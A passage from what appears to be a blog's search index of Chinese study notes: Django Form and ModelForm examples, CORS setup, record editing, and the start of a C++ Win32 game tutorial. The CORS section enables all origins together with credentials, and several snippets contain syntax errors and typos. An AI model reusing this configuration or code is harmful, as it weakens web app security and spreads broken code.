class="line">    </span><br><span class="line"><span class="comment"># views.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_add</span>(<span class="params">request</span>):</span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&quot;gender_choices&quot;</span>: models.UserInfo.gender_choices,</span><br><span class="line">        <span class="string">&quot;depart_list&quot;</span>: models.Department.objects.<span class="built_in">all</span>()</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">&#x27;user_add.html&#x27;</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="comment"># templates的html</span></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;label&gt;性别&lt;/label&gt;</span><br><span class="line">    &lt;select <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span><br><span class="line">        &#123;% <span class="keyword">for</span> item <span class="keyword">in</span> gender_choices %&#125;</span><br><span class="line">        &lt;option value=<span class="string">&quot;&#123;&#123; item.0 &#125;&#125;&quot;</span>&gt;&#123;&#123; item<span class="number">.1</span> &#125;&#125;&lt;/option&gt;</span><br><span class="line">        &#123;% endfor%&#125;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span><br><span class="line">    &lt;label&gt;部门&lt;/label&gt;</span><br><span class="line">    &lt;select <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span><br><span class="line">        &#123;% <span class="keyword">for</span> item <span class="keyword">in</span> depart_list %&#125;</span><br><span class="line">        &lt;option value=<span class="string">&quot;&#123;&#123; item.id &#125;&#125;&quot;</span>&gt;&#123;&#123; item.title &#125;&#125;&lt;/option&gt;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="3-设计时的问题"><a href="#3-设计时的问题" class="headerlink" title="3 设计时的问题"></a>3 设计时的问题</h3><blockquote><p>出现的问题：</p><ol><li>用户提交数据没有校验。</li><li>出现错误时，页面上应该有错误提示。</li><li>页面上，每一个字段都需要我们重新写一遍。</li><li>关联的数据，手动去获取并展示循环展示在页面。</li></ol><p>Form组件可以解决前3个问题。ModelForm可以解决全部。</p></blockquote><hr><h2 id="四、Form"><a href="#四、Form" class="headerlink" title="四、Form"></a>四、Form</h2><h3 id="1-简单案例"><a href="#1-简单案例" class="headerlink" title="1 简单案例"></a>1 简单案例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># views.py</span></span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"></span><br><span class="line"><span class="comment"># 继承Form</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyForm</span>(forms.Form):</span><br><span class="line">    <span class="comment"># widget是设置字段在html中输出时，自动输出为对应input标签</span></span><br><span class="line">    user = forms.CharField(widget=forms.TextInput)</span><br><span class="line">    pwd = forms.CharField(widget=forms.PasswordInput)</span><br><span class="line">    email = forms.CharField(widget=forms.EmailInput)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        forms = MyForm()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;index.html&#x27;</span>, &#123;<span class="string">&quot;forms&quot;</span>: forms&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># index.html</span></span><br><span class="line"><span class="comment"># 生成的样式：</span></span><br><span class="line"><span class="comment"># &lt;input type=&quot;text&quot; name=&quot;user&quot; required=&quot;&quot; id=&quot;id_user&quot;&gt;</span></span><br><span class="line"><span class="comment"># &lt;input type=&quot;password&quot; name=&quot;pwd&quot; required=&quot;&quot; id=&quot;id_pwd&quot;&gt;</span></span><br><span class="line"><span class="comment"># &lt;input type=&quot;email&quot; name=&quot;email&quot; required=&quot;&quot; id=&quot;id_email&quot;&gt;</span></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &#123;% <span class="keyword">for</span> field <span class="keyword">in</span> forms %&#125;</span><br><span class="line">    &#123;&#123; field &#125;&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="五、ModelForm"><a href="#五、ModelForm" class="headerlink" title="五、ModelForm"></a>五、ModelForm</h2><h3 id="1-简单案例-1"><a href="#1-简单案例-1" class="headerlink" title="1 简单案例"></a>1 简单案例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># views.py</span></span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyForm</span> (<span class="title class_ inherited__">ModelForm</span>) :</span><br><span class="line">    xx = forms.CharField(widget=forms.TextInput)</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        <span class="comment"># 选择数据库</span></span><br><span class="line">        model = UserInfo</span><br><span class="line">        <span class="comment"># 选择数据库中的值，也可以在此处自定义</span></span><br><span class="line">        fields =[<span class="string">&quot;username&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="string">&quot;email&quot;</span>,<span class="string">&quot;xx&quot;</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">        <span class="built_in">print</span>(self.instance.pk) <span class="comment"># 当前操作的数据的ID</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>) :</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">    forms = MyForm()</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;index.html&#x27;</span>, &#123;<span class="string">&quot;forms&quot;</span>: forms&#125;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># index.html</span></span><br><span class="line"><span class="comment"># 生成的样式同理Form</span></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &#123;% <span class="keyword">for</span> field <span class="keyword">in</span> forms %&#125;</span><br><span class="line">        &#123;&#123; field.label &#125;&#125; : &#123;&#123; field &#125;&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h3 id="2-模版输出"><a href="#2-模版输出" class="headerlink" title="2 模版输出"></a>2 模版输出</h3><figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="comment">&lt;!-- field.label获得字段的名称（verbose_name） --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> field <span class="keyword">in</span> forms %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123; field.label &#125;&#125;</span><span class="language-xml"> : </span><span class="template-variable">&#123;&#123; field &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="3-自定义input"><a href="#3-自定义input" class="headerlink" title="3 自定义input"></a>3 自定义input</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Models.py，连接外表可以在外表对应的数据库中定义__str__方法返回对应的名称，主表生成的下拉框会自动替换id为对应名称</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WorkInfo</span>(models.Model):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 作品表 &quot;&quot;&quot;</span></span><br><span class="line">    title = models.CharField(verbose_name=<span class="string">&#x27;作品分区&#x27;</span>, max_length=<span class="number">32</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.title</span><br><span class="line">    </span><br><span class="line"><span class="comment"># views.py，给input加上对应类名</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserHodelForm</span>(forms.ModelForm):</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">    model = models.UserInfo</span><br><span class="line">    fields = [<span class="string">&quot;name&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="string">&quot;age&quot;</span>]</span><br><span class="line">        <span class="comment"># 手动给每一个input绑定class值或其他值</span></span><br><span class="line">        widgets = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: forms.TextInput(attrs=&#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;form-control&quot;</span>&#125;),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: forms.PasswordInput(attrs=&#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;form-control&quot;</span>&#125;),</span><br><span class="line">            <span class="string">&quot;age&quot;</span>: forms.TextInput(attrs=&#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;form-control&quot;</span>&#125;),</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment"># 循环的方式绑定</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> name,field <span class="keyword">in</span> self.fields.items():</span><br><span class="line">            field.widget.attrs = &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;form-control&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="4-数据操作"><a href="#4-数据操作" class="headerlink" title="4 数据操作"></a>4 数据操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># views.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserHodelForm</span>(forms.ModelForm):</span><br><span class="line">    <span class="comment"># 重写验证条件，默认只有非空验证（validators：正则表达式）</span></span><br><span class="line">    name = forms.CharField(label=<span class="string">&quot;用户名&quot;</span>, min_length = <span class="number">3</span>)</span><br><span class="line">    password = forms.CharField(label=<span class="string">&quot;密码&quot;</span>, validators = [RegexValidator(<span class="string">r&#x27;^1[3-9]\d&#123;9&#125;$&#x27;</span>, <span class="string">&#x27;密码格式错误&#x27;</span>)])</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">    model = models.UserInfo</span><br><span class="line">    fields = [<span class="string">&quot;name&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="string">&quot;age&quot;</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> name,field <span class="keyword">in</span> self.fields.items():</span><br><span class="line">            field.widget.attrs = &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;form-control&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_model_form_add</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 添加数据 &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 自定的ModelForm类。model设置了哪个数据库就会对哪个数据库做操作</span></span><br><span class="line">    form = UserModelForm(data = request.POST)</span><br><span class="line">    <span class="comment"># 验证数据合法</span></span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="comment"># 保存数据到数据库，数据库是model指向的数据库</span></span><br><span class="line">        form.save()</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 存在错误信息form的值会被改变</span></span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;index.html&#x27;</span>, &#123;<span class="string">&quot;form&quot;</span>: form&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_edit</span>(<span class="params">request, nid</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;编辑用户&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 根据ID去数据库获取要编辑的那一行数据（对象）</span></span><br><span class="line">    row_object = models.UserInfo.objects.<span class="built_in">filter</span>(<span class="built_in">id</span> = nid).first()</span><br><span class="line">    <span class="comment"># Get请求进行</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="comment"># 加上instance = row_object后数据会直接显示在界面上充当默认数据</span></span><br><span class="line">        form = UserModelForm(instance = row_object)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render(request,<span class="string">&#x27;index.html&#x27;</span>,&#123;<span class="string">&#x27;form&#x27;</span>: form&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 告知操作的对象</span></span><br><span class="line">    form = UserModelForm(data = request.POST, instance = row_object)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="comment"># 默认保存的是用户输入的所有数据，如果想要再用户输入以外增加值可以输入下列代码</span></span><br><span class="line">        <span class="comment"># form.instance.字段名=值</span></span><br><span class="line">        form.save()</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;index.html&#x27;</span>, &#123;<span class="string">&quot;form&quot;</span>: form&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># index.html</span></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &#123;% <span class="keyword">for</span> field <span class="keyword">in</span> form %&#125;</span><br><span class="line">        &lt;label&gt; &#123;&#123; field.label &#125;&#125; &lt;/label&gt;</span><br><span class="line">        &#123;&#123; field &#125;&#125;</span><br><span class="line">        &lt;!-- 输出错误信息，可能非常多，是一个列表，只用第一个即可 --&gt;</span><br><span class="line">        &lt;span style=<span class="string">&quot;color: red&quot;</span>&gt; &#123;&#123; field.errors<span class="number">.0</span> &#125;&#125; &lt;/style&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h3 id="5-Meta类"><a href="#5-Meta类" class="headerlink" title="5 Meta类"></a>5 Meta类</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 排除某个字段（例如：level）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">    model = models.UserInfo</span><br><span class="line">    fields = <span class="string">&quot;__all__&quot;</span></span><br><span class="line">    exclude = [<span class="string">&#x27;level&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="6-数据校验"><a href="#6-数据校验" class="headerlink" title="6 数据校验"></a>6 数据校验</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PrettyModelForm</span>(forms.ModelForm):</span><br><span class="line"><span class="comment"># 方式1：正则表达式</span></span><br><span class="line">mobile = forms.CharField(</span><br><span class="line">label = <span class="string">&quot;手机号&quot;</span>，</span><br><span class="line">validators = [RegexValidator(<span class="string">r&#x27;^1[3-9]\d9$&#x27;</span>, <span class="string">&#x27;手机号格式错误&quot;)],</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 方式2：钩子函数（若字段存在，类会自动生成clean_字段的函数，在接收到数据后会自动调用该函数）</span></span><br><span class="line"><span class="string">    def clean_mobile(self):</span></span><br><span class="line"><span class="string">    txt_mobile = self.cleaned_data[&quot;mobile&quot;]</span></span><br><span class="line"><span class="string">    if len(txt_mobile) !=11:</span></span><br><span class="line"><span class="string">    # 验证不通过</span></span><br><span class="line"><span class="string">    raise ValidationError(&quot;格式错误&quot;)</span></span><br><span class="line"><span class="string">    # 验证通过，用户输入的值返回</span></span><br><span class="line"><span class="string">    return txt_mobild</span></span><br></pre></td></tr></table></figure><h2 id="六、网络"><a href="#六、网络" class="headerlink" title="六、网络"></a>六、网络</h2><h3 id="1-token"><a href="#1-token" class="headerlink" title="1 token"></a>1 token</h3><h3 id="2-跨域问题"><a href="#2-跨域问题" class="headerlink" title="2 跨域问题"></a>2 跨域问题</h3><blockquote><p>同源策略是浏览器的一项安全策略，浏览器只允许js代码请求和当前所在服务器域名，端口，协议相同的数据接口上的数据,这就是同源策略。</p><p>也就是说，当<strong>协议、域名、端口</strong>任意一个不相同时，都会产生跨域问题，所以又应该如何解决跨域问题呢。</p><p>安装：</p><ul><li><code>pip install djangorestframework</code></li><li><code>pip install django-cors-headers</code></li></ul></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># setting.py配置</span></span><br><span class="line"><span class="comment"># 修改代码</span></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&#x27;rest_framework&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;corsheaders&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注：引入在第三行</span></span><br><span class="line">MIDDLEWARE = [</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&#x27;corsheaders.middleware.CorsMiddleware&#x27;</span>,</span><br><span class="line">    ...</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加代码</span></span><br><span class="line">CORS_ALLOW_CREDENTIALS = <span class="literal">True</span></span><br><span class="line">CORS_ORIGIN_ALLOW_ALL = <span class="literal">True</span></span><br><span class="line">CORS_ALLOW_HEADERS = (<span class="string">&#x27;*&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="七、实践功能"><a href="#七、实践功能" class="headerlink" title="七、实践功能"></a>七、实践功能</h2><h3 id="1-邮箱验证码"><a href="#1-邮箱验证码" class="headerlink" title="1 邮箱验证码"></a>1 邮箱验证码</h3><h3 id="2-修改文本"><a href="#2-修改文本" class="headerlink" title="2 修改文本"></a>2 修改文本</h3><blockquote><p>页面没变，通过GET和POST请求的方式不同完成编辑。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># urls.py</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">&#x27;depart/&lt;int:nid&gt;/list/&#x27;</span>, view.depart_list)，</span><br><span class="line">    path(<span class="string">&#x27;depart/&lt;int:nid&gt;/edit/&#x27;</span>, view.depart_edit)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># views.py</span></span><br><span class="line"><span class="comment"># 根据请求来判断页面</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">depart_list</span>(<span class="params">request</span>):</span><br><span class="line">    queryset = models.Department.objects.<span class="built_in">all</span>()  <span class="comment"># 获取所有部门对象，传递给模板</span></span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;depart_edit.html&#x27;</span>, &#123;<span class="string">&quot;queryset&quot;</span>: queryset&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">depart_edit</span>(<span class="params">request, nid</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="comment"># 根据nid，获取数据</span></span><br><span class="line">        row_object = models.Department.objects.<span class="built_in">filter</span>(<span class="built_in">id</span> = nid).first()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;depart_edit.html&#x27;</span>, &#123;<span class="string">&quot;row_object&quot;</span>: row_object&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># POST，根据ID进行更新</span></span><br><span class="line">    title = request.POST.get(<span class="string">&quot;title&quot;</span>)</span><br><span class="line">    models.Department.objects.<span class="built_in">filter</span>(<span class="built_in">id</span> = nid).update(title = title)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/depart/list&#x27;</span>)  <span class="comment"># 更新成功后重定向到部门列表页面</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># templates的html</span></span><br><span class="line">&lt;tbody&gt;</span><br><span class="line">&#123;% <span class="keyword">for</span> obj <span class="keyword">in</span> queryset %&#125;</span><br><span class="line">    &lt;!-- GET请求,进入对应编辑界面 --&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/depart/&#123;&#123; obj.id &#125;&#125;/edit/&quot;</span>&gt;编辑&lt;/a&gt;</span><br><span class="line">   &#123;% endfor%&#125;</span><br><span class="line">&lt;/tbody&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line">    &lt;<span class="built_in">input</span> name=<span class="string">&quot;title&quot;</span> value=<span class="string">&quot;&#123;&#123; row_object.title &#125;&#125;&quot;</span> /&gt;</span><br><span class="line">    &lt;button <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> web框架 </tag>
            
            <tag> Web后端 </tag>
            
            <tag> python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++游戏</title>
      <link href="/posts/251c2987.html"/>
      <url>/posts/251c2987.html</url>
      
        <content type="html"><![CDATA[<h1 id="C-游戏"><a href="#C-游戏" class="headerlink" title="C++游戏"></a>C++游戏</h1><blockquote><p><a href=".\5751eea2">text::C++</a></p></blockquote><hr><h1 id="一、新建窗口项目"><a href="#一、新建窗口项目" class="headerlink" title="一、新建窗口项目"></a>一、新建窗口项目</h1><h2 id="1-新建项目"><a href="#1-新建项目" class="headerlink" title="1 新建项目"></a>1 新建项目</h2><blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/_winmsg/">official::Windows 和消息 - Win32</a></p><p>VSStudio——新建项目——Windows桌面应用程序——新建（此处项目名为PvZ）</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PvZ.cpp : 定义应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;PvZ.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LOADSTRING 100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量:</span></span><br><span class="line">HINSTANCE hInst;                                <span class="comment">// 当前实例</span></span><br><span class="line">WCHAR szTitle[MAX_LOADSTRING];                  <span class="comment">// 标题栏文本</span></span><br><span class="line">WCHAR szWindowClass[MAX_LOADSTRING];            <span class="comment">// 主窗口类名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 此代码模块中包含的函数的前向声明:</span></span><br><span class="line"><span class="function">ATOM                <span class="title">MyRegisterClass</span><span class="params">(HINSTANCE hInstance)</span></span>;</span><br><span class="line"><span class="function">BOOL                <span class="title">InitInstance</span><span class="params">(HINSTANCE, <span class="type">int</span>)</span></span>;</span><br><span class="line"><span class="function">LRESULT CALLBACK    <span class="title">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</span><br><span class="line"><span class="function">INT_PTR CALLBACK    <span class="title">About</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ LPWSTR    lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(hPrevInstance);</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(lpCmdLine);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处放置代码。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化全局字符串</span></span><br><span class="line"><span class="built_in">LoadStringW</span>(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);</span><br><span class="line"><span class="built_in">LoadStringW</span>(hInstance, IDC_PVZ, szWindowClass, MAX_LOADSTRING);</span><br><span class="line"><span class="built_in">MyRegisterClass</span>(hInstance);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行应用程序初始化:</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">InitInstance</span>(hInstance, nCmdShow))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HACCEL hAccelTable = <span class="built_in">LoadAccelerators</span>(hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDC_PVZ));</span><br><span class="line"></span><br><span class="line">MSG msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主消息循环:</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">TranslateAccelerator</span>(msg.hwnd, hAccelTable, &amp;msg))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="type">int</span>)msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-MyRegisterClass"><a href="#2-MyRegisterClass" class="headerlink" title="2 MyRegisterClass"></a>2 MyRegisterClass</h2><blockquote><p>注册窗口类</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ATOM <span class="title">MyRegisterClass</span><span class="params">(HINSTANCE hInstance)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顶端栏，去除可以改成NULL</span></span><br><span class="line">wcex.lpszMenuName = <span class="built_in">MAKEINTRESOURCEW</span>(IDC_PVZ);</span><br></pre></td></tr></table></figure><h2 id="3-InitInstance"><a href="#3-InitInstance" class="headerlink" title="3 InitInstance"></a>3 InitInstance</h2><blockquote><p>保存实例句柄并创建主窗口</p><p>在此函数中，我们在全局变量中保存实例句柄并创建和显示主程序窗口</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InitInstance</span><span class="params">(HINSTANCE hInstance, <span class="type">int</span> nCmdShow)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 窗口设定（禁止最大化和拉动窗口，去除功能只需要 &amp;~ 再加对应的属性名即可）</span></span><br><span class="line">HWND hWnd = <span class="built_in">CreateWindowW</span>(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW &amp; ~WS_THICKFRAME &amp; ~WS_MAXIMIZEBOX,CW_USEDEFAULT, <span class="number">0</span>, CW_USEDEFAULT, <span class="number">0</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, hInstance, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改窗口大小，写在ShowWindow前（句柄，窗口位置，窗口大小，是否重新绘制窗口）</span></span><br><span class="line"><span class="built_in">MoveWindow</span>(hWnd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1280</span>, <span class="number">720</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h2 id="4-WndProc"><a href="#4-WndProc" class="headerlink" title="4 WndProc"></a>4 WndProc</h2><blockquote><p>处理主窗口的消息</p><ul><li>WM_COMMAND：处理应用程序菜单</li><li>WM_PAINT：绘制主窗口</li><li>WM_DESTROY：发送退出消息并返回</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="5-About"><a href="#5-About" class="headerlink" title="5 About"></a>5 About</h2><blockquote><p>“关于”框的消息处理程序</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">About</span><span class="params">(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)</span></span>;</span><br></pre></td></tr></table></figure><hr><h1 id="二、游戏逻辑基础"><a 